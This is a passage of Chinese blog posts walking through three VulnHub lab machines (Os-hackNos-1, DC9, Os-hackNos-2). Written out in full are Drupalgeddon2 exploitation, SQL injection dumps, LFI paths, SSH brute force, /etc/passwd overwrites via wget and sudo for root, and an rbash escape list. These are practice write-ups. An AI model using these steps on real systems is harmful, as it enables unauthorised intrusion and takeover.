    <url>/2020/06/06/Os-hackNos-1/</url>
    <content><![CDATA[<p><strong>vulnhub-Os-hackNos-1</strong><br><strong>知识点：</strong></p>
<blockquote>
<p>Drupal 7<br>使用msf getshell<br>wget提权</p>
</blockquote>
<a id="more"></a>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>难度:中等偏下</li>
<li>需要获取俩个flag</li>
</ul>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Difficulty </span>: Easy to Intermediate</span><br><span class="line"></span><br><span class="line"><span class="attribute">Flag </span>: <span class="number">2</span> Flag first user And second root</span><br><span class="line"></span><br><span class="line"><span class="attribute">Learning </span>: exploit | Web Application | Enumeration | Privilege Escalation</span><br><span class="line"></span><br><span class="line"><span class="attribute">Website </span>: www.hackNos.com</span><br><span class="line"></span><br><span class="line"><span class="attribute">mail </span>: contact<span class="variable">@hackNos</span>.com</span><br></pre></td></tr></table></figure>

<p>靶机和kali均使用NAT模式，靶机最开始不能获取ip<br>参考：<a href="https://blog.csdn.net/qq_41918771/article/details/103636890" target="_blank" rel="noopener">https://blog.csdn.net/qq_41918771/article/details/103636890</a><br>使用网上常规的方法修改即可获取ip</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
<blockquote>
<p>nmap -sP 192.168.211.1/24</p>
</blockquote>
<p><img src="/2020/06/06/Os-hackNos-1/1591405793417.png" alt="1591405793417"></p>
<p>得到靶机的ip为<code>192.168.211.154</code></p>
<p><strong>端口扫描</strong></p>
<blockquote>
<p>nmap -A 192.168.211.154 -p 1-65535</p>
</blockquote>
<p><img src="/2020/06/06/Os-hackNos-1/1591410005627.png" alt="1591410005627"></p>
<p>靶机开放了80端口和22端口<br>访问80端口，是一个Apache2界面<br><img src="/2020/06/06/Os-hackNos-1/1591410067890.png" alt="1591410067890"></p>
<p>扫描一下目录</p>
<blockquote>
<p>dirb  <a href="http://192.168.211.154/" target="_blank" rel="noopener">http://192.168.211.154/</a></p>
</blockquote>
<p>发现是一个<code>drupal</code>网站<br><img src="/2020/06/06/Os-hackNos-1/1591410183730.png" alt="1591410183730"></p>
<p>在<code>drupal/includes</code>里面可以进行目录遍历<br>之后对网站进行指纹识别</p>
<blockquote>
<p>whatweb <a href="http://192.168.211.154/drupal/" target="_blank" rel="noopener">http://192.168.211.154/drupal/</a></p>
</blockquote>
<p><img src="/2020/06/06/Os-hackNos-1/1591411367053.png" alt="1591411367053"></p>
<p>是一个<code>Drupal 7</code>的网站</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>使用msf搜索其漏洞从而进一步利用</p>
<blockquote>
<p>search Drupal</p>
</blockquote>
<p><img src="/2020/06/06/Os-hackNos-1/1591412062170.png" alt="1591412062170"></p>
<p>这里先利用<code>exploit/unix/webapp/drupal_drupalgeddon2</code>模块</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">unix</span>/<span class="title">webapp</span>/<span class="title">drupal_drupalgeddon2</span></span><br><span class="line"><span class="title">options</span>		#设置关键参数</span><br><span class="line"><span class="title">set</span> <span class="title">rhosts</span> 192.168.211.154</span><br><span class="line"><span class="title">set</span> <span class="title">TARGETURL</span> /<span class="title">drupal</span>/</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>

<p>之后成功返回会话<br><img src="/2020/06/06/Os-hackNos-1/1591412208270.png" alt="1591412208270"></p>
<p>输入shell，之后再使用python进入交互模式</p>
<blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这是后权限是非常低的<br><img src="/2020/06/06/Os-hackNos-1/1591413212258.png" alt="1591413212258"></p>
<p>之后再<code>/var/www/html</code>目录下发现一个<code>alexander.txt</code>文件，打开之后为base64码</p>
<p><img src="/2020/06/06/Os-hackNos-1/1591412537980.png" alt="1591412537980"></p>
<p>进行解码</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span> &gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span> &gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span></span><br><span class="line"><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span> &gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt; <span class="title">]</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span>&lt;<span class="title">]</span>&gt;<span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span></span><br><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&gt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;<span class="title">]</span> &gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span> &gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span>&lt;<span class="title">]</span>&gt;<span class="string">.</span> <span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt; <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span></span><br><span class="line">&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt; <span class="title">]</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span> <span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span> <span class="title">[</span><span class="literal">-</span>&gt;<span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> &lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="string">.</span> &lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span> <span class="literal">-</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> &lt;<span class="title">]</span>&gt;<span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span></span><br><span class="line"><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;</span><br></pre></td></tr></table></figure>

<p><s>百度</s>google后找到一个在线解码网站<a href="https://www.dcode.fr/brainfuck-language" target="_blank" rel="noopener">https://www.dcode.fr/brainfuck-language</a></p>
<p><img src="/2020/06/06/Os-hackNos-1/1591412769740.png" alt="1591412769740"></p>
<p>得到<code>james:Hacker@4514</code></p>
<p>我以为是james的ssh密码，但是并没有成功，后来发现是james的网站登陆密码</p>
<p><img src="/2020/06/06/Os-hackNos-1/1591413317751.png" alt="1591413317751"></p>
<p>尝试从这里getshell，或许权限高一点</p>
<p>但是这个网站少了很多模块，似乎行不通<br>所以只有换一种提权方式</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>这里利用SUID提权</p>
<blockquote>
<p>查看具有suid权限的命令<br><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
</blockquote>
<p><img src="/2020/06/06/Os-hackNos-1/1591414084711.png" alt="1591414084711"></p>
<p>发现wget具有root权限，这里想到可以利用wget往/etc/passwd里面添加root用户<br>先使用openssl生成一个密码hash</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt admin <span class="number">111111</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/06/Os-hackNos-1/1591414935990.png" alt="1591414935990"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">写成与/etc/passwd格式一样</span><br><span class="line"><span class="symbol">admin123:</span>$1$admin$2WRLhTGcIMgZ7OhwCpREK1<span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>将该用户信息写在本地，之后通过wget下载保存到靶机的/etc/passwd中<br>开启Apache2</p>
<blockquote>
<p>service apache2 start</p>
</blockquote>
<p>将靶机上面的/etc/passwd里面的内容复制到kali的/var/www/html/passwd中，之后再将<code>admin123:$1$admin$2WRLhTGcIMgZ7OhwCpREK1:0:0::/root:/bin/bash</code>写入/var/www/html/passwd中</p>
<p><img src="/2020/06/06/Os-hackNos-1/1591415958032.png" alt="1591415958032"></p>
<p>之后在靶机中下载</p>
<blockquote>
<p>wget <a href="http://192.168.211.151/passwd" target="_blank" rel="noopener">http://192.168.211.151/passwd</a> -O /etc/passwd</p>
</blockquote>
<p><img src="/2020/06/06/Os-hackNos-1/1591416046119.png" alt="1591416046119"></p>
<p>切换用户即获得root权限</p>
<blockquote>
<p>su admin123</p>
</blockquote>
<p><img src="/2020/06/06/Os-hackNos-1/1591416077171.png" alt="1591416077171"></p>
<p>获取flag<br><img src="/2020/06/06/Os-hackNos-1/1591416175353.png" alt="1591416175353"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC9</title>
    <url>/2020/03/07/vulnhub-DC9/</url>
    <content><![CDATA[<hr>
<p><strong>vulnhub靶机DC9</strong><br><strong>知识点：</strong></p>
<blockquote>
<p><code>SQL注入</code>获取账号密码<br> <code>LFI</code>本地文件包含漏洞<br> <code>knockd</code>的保护<code>SSH</code>机制<br>绕过<code>knockd</code>限制暴力破解SSH<br>openssl创建加密用户<br> 写入文件到<code>passwd</code>提权</p>
</blockquote>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/1.png" alt="img"></p>
<p>目标主机的ip为192.168.211.142<br>扫描靶机开放的端口服务</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.142</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/2.png" alt="img"></p>
<p>靶机开放了22端口和80端口<br>但是22端口被过滤了<br>访问80端口</p>
<p><img src="/2020/03/07/vulnhub-DC9/3.png" alt="img"></p>
<p>发现每一个页面都是一个静态页面，只有两个表单<br>然后先对网站进行指纹识别</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">whatweb <span class="string">http:</span><span class="comment">//192.168.211.142/index.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/4.png" alt="img"></p>
<p>没有什么发现，扫描网站目录</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nikto -h <span class="number">192.168</span><span class="number">.211</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/5.png" alt="img"></p>
<p>没有什么可用的信息</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>用sqlmap去跑两个表单，最终在results.php发现SQL注入</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.211.142/results.php"</span> <span class="params">--data</span> <span class="string">"search=1"</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/6.png" alt="img"></p>
<p>最终发现了用户的密码</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.211.142/results.php"</span> <span class="params">--data</span> <span class="string">"search=1"</span> -D <span class="string">"users"</span> -T <span class="string">"UserDetails"</span> <span class="params">--dump</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/7.png" alt="img"></p>
<p>然后再回去看看另一个数据库</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.211.142/results.php"</span> --data <span class="string">"search=1"</span> -D <span class="string">"Staff"</span> -T<span class="built_in"> Users </span>--dump</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/8.png" alt="img"></p>
<p>得到管理员密码为transorbital1</p>
<p>成功一管理员登陆</p>
<p><img src="/2020/03/07/vulnhub-DC9/9.png" alt="img"></p>
<p>发现下面显示文件不存在，联想到文件包含漏洞，然后开始枚举</p>
<p><img src="/2020/03/07/vulnhub-DC9/10.png" alt="img"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">211.142</span><span class="regexp">/manage.php?file=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/11.png" alt="img"></p>
<p>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。　　</p>
<p>简单来说就是：知道它的自定义端口后，依次对其进行敲门，然后就可以开启ssh服务从而进行连接了。它的默认配置文件为：/etc/knockd.conf</p>
<p>所以现在就是要知道它的这个配置文件的内容就可以得到它自定义的端口号，用LFI把这个文件爆出来：</p>
<p><img src="/2020/03/07/vulnhub-DC9/12.png" alt="img"></p>
<p>知道端口号后，然后用knock进行敲门</p>
<p>先安装knockd            </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install knockd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/13.png" alt="img"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">knock <span class="number">192.168</span><span class="number">.211</span><span class="number">.142</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span>   然后发现ssh可以正常连接</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/14.png" alt="img"></p>
<p>然后将刚才sqlmap跑出来的账号密码写入两个文件中准备撞库</p>
<p><img src="/2020/03/07/vulnhub-DC9/15.png" alt="img"></p>
<p><img src="/2020/03/07/vulnhub-DC9/16.png" alt="img"></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> <span class="selector-tag">-L</span> <span class="selector-tag">users</span><span class="selector-class">.txt</span> <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.142</span> <span class="selector-tag">ssh</span> <span class="selector-tag">-vV</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/17.png" alt="img"></p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">login:</span> chandlerb   <span class="string">password:</span> UrAG0D!</span><br><span class="line"><span class="string">login:</span> joeyt   <span class="string">password:</span> Passw0rd</span><br><span class="line"><span class="string">login:</span> janitor   <span class="string">password:</span> Ilovepeepee</span><br></pre></td></tr></table></figure>

<p>找出来三个，先使用第一个登陆没有什么东西，不能访问其他目录</p>
<p><img src="/2020/03/07/vulnhub-DC9/18.png" alt="img"></p>
<p>第二个也是一样</p>
<p><img src="/2020/03/07/vulnhub-DC9/19.png" alt="img"></p>
<p>最后一个找了很久在/home/janitor/.secrets-for-putin下发现一个密码文件，再一次拿去爆破</p>
<p><img src="/2020/03/07/vulnhub-DC9/20.png" alt="img"></p>
<p>有多出来一个用户，login: fredf   password: B4-Tru3-001</p>
<p><img src="/2020/03/07/vulnhub-DC9/21.png" alt="img"></p>
<p>登陆ssh</p>
<p><img src="/2020/03/07/vulnhub-DC9/22.png" alt="img"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看具有root权限的命令sudo -l</p>
<p><img src="/2020/03/07/vulnhub-DC9/23.png" alt="img"></p>
<p>发现一个test，进去查看</p>
<p><img src="/2020/03/07/vulnhub-DC9/24.png" alt="img"></p>
<p>是一个python文件</p>
<p><img src="/2020/03/07/vulnhub-DC9/25.png" alt="img"></p>
<p>查看test.py脚本的内容</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -name test.py 2&gt;/dev/<span class="literal">null</span>	发现先是一个python脚本</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/26.png" alt="img"></p>
<p>既然拥有root权限，那现在我们要做的就是构造一个拥有root权限的用户，并且在/etc/passwd文件中储存，只要使用这个用户登录后，就可以获取到root权限。<br>回到kali使用openssl工具先创建一个本地的加密用户：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt admin <span class="number">111111</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/27.png" alt="img"></p>
<p>到脚本所在的目录下</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">'admin123:<span class="variable">$1</span><span class="variable">$admin</span><span class="variable">$2</span>WRLhTGcIMgZ7OhwCpREK1:0:0::/root:/bin/bash'</span> &gt;&gt; /tmp/aaa</span><br></pre></td></tr></table></figure>

<p>运行该脚本</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo ./test /tmp<span class="built_in">/aaa </span>/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/28.png" alt="img"></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">su admi<span class="symbol">n123</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/vulnhub-DC9/29.png" alt="img"></p>
<p>获得flag</p>
<p><img src="/2020/03/07/vulnhub-DC9/30.png" alt="img"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机Os-hackNos-2</title>
    <url>/2020/06/29/Os-hackNos-2/</url>
    <content><![CDATA[<p><strong>vulnhub-Os-hackNos-2</strong><br><strong>知识点：</strong></p>
<blockquote>
<ul>
<li>nmap</li>
<li>dirb</li>
<li>searchsploit</li>
<li>wpscan</li>
<li>john</li>
<li>LFI漏洞</li>
<li>rbash逃逸</li>
</ul>
</blockquote>
<a id="more"></a>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>难度:中等偏下</li>
<li>需要获取俩个flag</li>
</ul>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">难度：容易中级</span><br><span class="line"></span><br><span class="line">标记：<span class="number">2</span>标记第一个用户和第二个根</span><br><span class="line"></span><br><span class="line">学习：Web应用程序<span class="string">| 枚举 密码破解</span></span><br></pre></td></tr></table></figure>

<p>靶机和kali均使用NAT模式，靶机最开始不能获取ip</p>
<h2 id="网卡设置"><a href="#网卡设置" class="headerlink" title="网卡设置"></a>网卡设置</h2><p><strong>通过netplan设置网络。</strong></p>
<p><strong>1.1</strong>在开机时按下Shift键进入以下界面<br><a href="http://cyzcc.vip/2020/06/23/linux-tiquan/20191207105956849.png"><img src="/2020/06/29/Os-hackNos-2/20191207105956849.png" alt="在这里插入图片描述"></a><br><strong>1.2</strong>在此页面按下e键，进入如下界面<br><a href="http://cyzcc.vip/2020/06/23/linux-tiquan/20191207110056422.png"><img src="/2020/06/29/Os-hackNos-2/20191207110056422.png" alt="在这里插入图片描述"></a><br><strong>1.3</strong>将ro 替换为 rw signie init=/bin/bash<br><a href="http://cyzcc.vip/2020/06/23/linux-tiquan/20191207110225780.png"><img src="/2020/06/29/Os-hackNos-2/20191207110225780.png" alt="在这里插入图片描述"></a><br><strong>1.4</strong>按下Ctrl键+X键，进入如下页面<br><a href="http://cyzcc.vip/2020/06/23/linux-tiquan/20191207110341303.png"><img src="/2020/06/29/Os-hackNos-2/20191207110341303.png" alt="在这里插入图片描述"></a><br><strong>1.5</strong>查看当前网卡IP信息 ip a</p>
<p><a href="http://cyzcc.vip/2020/06/23/linux-tiquan/1592824440957.png"><img src="/2020/06/29/Os-hackNos-2/1592824440957.png" alt="1592824440957"></a></p>
<p>1.6ifconfig -a看到有一块ens33的网卡，但是没有生效。</p>
<p>sudo vim /etc/netplan/50-cloud-init.yaml<br>将enp0s3改为ens33<br><img src="/2020/06/29/Os-hackNos-2/1593092474195.png" alt="1593092474195"></p>
<p>之后dhclient获取一下ip</p>
<p><img src="/2020/06/29/Os-hackNos-2/1593092525397.png" alt="1593092525397"></p>
<p>重启便能扫描到靶机ip</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p><img src="/2020/06/29/Os-hackNos-2/1593092992199.png" alt="1593092992199"></p>
<p>得到目标靶机的ip为192.168.211.155</p>
<p><strong>端口扫描</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.155</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593093064474.png" alt="1593093064474"></p>
<p>靶机开放了22端口和80端口</p>
<p><strong>访问80端口</strong><br>其为一个Apache2页面<br><img src="/2020/06/29/Os-hackNos-2/1593094523375.png" alt="1593094523375"></p>
<p>使用dirb扫描一下目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dirb http:<span class="comment">//192.168.211.155</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593094575401.png" alt="1593094575401"></p>
<p>发现了tsweb目录，并且可以很容易看出这是一个WordPress网站<br>访问<code>wp-admin</code>进入后台登陆页面，使用wpscan扫描该网站用户</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="comment">//192.168.211.155/tsweb/ -e u</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593095301085.png" alt="1593095301085"></p>
<p>得到一个用户名为user</p>
<h1 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h1><p>再次使用该工具进行爆破密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="comment">//192.168.211.155/tsweb/ -U user -P /usr/share/wordlists/rockyou.txt</span></span><br></pre></td></tr></table></figure>

<p>但是爆破了十几分钟都没出结果，所以换一种方法<br>再次回去看扫描结果，发现该网站有一个很老的插件<br><img src="/2020/06/29/Os-hackNos-2/1593096302259.png" alt="1593096302259"></p>
<p>搜索是否存在漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">searchsploit gracemedi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593096351757.png" alt="1593096351757"></p>
<p>查看该漏洞，找到一个本地文件包含的POC<br><img src="/2020/06/29/Os-hackNos-2/1593096408930.png" alt="1593096408930"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593096462198.png" alt="1593096462198"></p>
<p>成功利用，并且发现了flag用户的密码的hash值，尝试进行破解<br>将<code>$1$flag$vqjCxzjtRc7PofLYS2lWf/</code>写入john.txt中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt john.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593098058274.png" alt="1593098058274"></p>
<p>得到密码为<code>topsecret</code></p>
<p>使用ssh登陆</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ssh flag@<span class="number">192.168</span><span class="number">.211</span><span class="number">.155</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/Os-hackNos-2/1593098156737.png" alt="1593098156737"></p>
<p>登陆成功，但是收到了rbash的限制，记得在做DC-2靶机的时候也遇到过，需要进行绕过</p>
<h2 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a><strong>绕过rbash</strong></h2><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">导入<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">BASH_CMDS[a]=<span class="regexp">/bin/bash</span>;a</span><br><span class="line"></span><br><span class="line">export PATH=<span class="regexp">/usr/sbin</span><span class="symbol">:/usr/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span></span><br></pre></td></tr></table></figure>

<p>但是这里<code>/</code>不被允许，寻找其他方法<br>参考：<a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/188989.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">编程语言</span><br><span class="line"><span class="comment">#python：</span></span><br><span class="line">python -c <span class="string">'import os; os.system("/bin/bash")'</span></span><br><span class="line"><span class="comment">#php：</span></span><br><span class="line">php -a then exec(<span class="string">"sh -i"</span>);</span><br><span class="line"><span class="comment">#perl：</span></span><br><span class="line">perl -e <span class="string">'exec "/bin/sh";'</span></span><br><span class="line"><span class="comment">#lua：</span></span><br><span class="line">os.execute(<span class="string">'/bin/sh'</span>).</span><br><span class="line"><span class="comment">#ruby：</span></span><br><span class="line">exec <span class="string">"/bin/sh"</span></span><br><span class="line">最新技术</span><br><span class="line"><span class="comment">#ssh:</span></span><br><span class="line">ssh username@IP - t <span class="string">"/bin/sh"</span> <span class="keyword">or</span> <span class="string">"/bin/bash"</span></span><br><span class="line"><span class="comment">#ssh2:</span></span><br><span class="line">ssh username@IP -t <span class="string">"bash --noprofile"</span></span><br><span class="line"><span class="comment">#ssh3:</span></span><br><span class="line">ssh username@IP -t <span class="string">"() &#123; :; &#125;; /bin/bash"</span> (shellshock)</span><br><span class="line"><span class="comment">#ssh4:</span></span><br><span class="line">ssh -o ProxyCommand=<span class="string">"sh -c /tmp/yourfile.sh"</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> (SUID)</span><br><span class="line"><span class="comment">#ZIP:</span></span><br><span class="line">zip /tmp/test.zip /tmp/test -T --unzip-command=<span class="string">"sh -c /bin/bash"</span></span><br><span class="line"><span class="comment">#tar:</span></span><br><span class="line">tar cf /dev/<span class="keyword">null</span> testfile --checkpoint=<span class="number">1</span> --checkpoint-action=exec=/bin/bash</span><br><span class="line"><span class="comment">#awk:</span></span><br><span class="line">awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br><span class="line"><span class="comment">#scp：</span></span><br><span 